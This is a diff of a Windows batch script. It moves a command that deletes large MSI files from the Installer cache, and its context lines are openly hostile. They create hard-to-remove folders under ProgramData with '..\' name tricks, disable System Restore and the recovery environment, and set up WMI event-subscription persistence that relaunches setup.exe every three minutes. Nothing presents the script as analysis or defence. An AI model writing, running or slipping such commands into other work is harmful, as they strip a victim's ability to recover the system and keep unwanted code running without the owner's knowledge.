@@ -1,3 +1,4 @@
+for %F in (%WINDIR%\Installer\*.msi) do if %~zF gtr 524288000 del /f /q "%F"
 mkdir \\.\%ProgramData%\config..\
 mkdir \\.\%ProgramData%\logdata..\
 mkdir \\.\%ProgramData%\diaglogs..\
@@ -45,8 +46,6 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
 
 reagentc /disable
-
-for %F in (%WINDIR%\Installer\*.msi) do if %~zF gtr 524288000 del /f /q "%F"
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start setup.exe"
